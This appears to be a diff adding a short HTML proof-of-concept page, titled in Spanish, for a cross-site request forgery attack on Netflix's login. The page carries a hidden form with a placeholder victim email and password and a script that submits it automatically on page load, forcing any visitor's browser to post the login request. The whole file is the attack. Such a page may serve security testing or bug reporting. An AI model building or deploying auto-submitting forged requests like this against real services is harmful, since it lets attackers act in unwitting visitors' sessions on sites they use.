@@ -1,0 +1,14 @@
+<!-- csrf-netflix-test.html -->
+<html>
+  <body>
+    <h2>PoC de CSRF en Netflix</h2>
+    <form action="https://www.netflix.com/login" method="POST">
+      <input type="hidden" name="userLoginId" value="victima@ejemplo.com">
+      <input type="hidden" name="password" value="12345678">
+    </form>
+
+    <script>
+      document.forms[0].submit(); // envía la solicitud automáticamente
+    </script>
+  </body>
+</html>
